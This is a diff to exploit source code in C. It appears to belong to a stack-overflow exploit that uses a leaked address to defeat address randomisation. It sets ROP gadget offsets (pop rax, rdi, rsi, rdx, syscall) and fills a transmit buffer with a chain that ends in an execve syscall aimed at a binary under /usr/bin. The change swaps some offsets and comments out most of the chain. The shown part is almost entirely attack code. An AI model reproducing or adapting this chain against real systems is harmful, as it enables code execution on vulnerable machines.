@@ -367,7 +367,7 @@ static void stack_overflow(uint64_t leaked_addr)
 	uint64_t	*codebuff;
 
 	uint64_t pop_rax_offset = 0x11C40;
-	uint64_t syscall_offset = 0xC8C9;
+	uint64_t syscall_offset = 0x1264FF;
 	uint64_t pop_rdi_offset = 0x4EA17;
 	uint64_t pop_rsi_offset = 0x54922;
 	uint64_t pop_rdx_offset = 0x16D7D9;
@@ -402,7 +402,9 @@ static void stack_overflow(uint64_t leaked_addr)
 
 	// Setup payload
 	codebuff = (uint64_t *) &(tx_buffer[0x4048]);
-	codebuff[0] = leaked_addr + pop_rdx_offset;
+	codebuff[0] = leaked_addr + 0x1fa5c;
+
+/*	codebuff[0] = leaked_addr + pop_rdx_offset;
 	codebuff[1] = 0x6E69622F7273752F; // /usr/bin
 	codebuff[2] = leaked_addr + pop_rax_offset;
 	codebuff[3] = address_1;
@@ -483,6 +485,7 @@ static void stack_overflow(uint64_t leaked_addr)
 	codebuff[68] = leaked_addr + pop_rax_offset;
 	codebuff[69] = 0x3B;
 	codebuff[70] = leaked_addr + syscall_offset;
+*/
 	//-----------------------------------------//
 
 	//----------- Descriptors setup -----------//
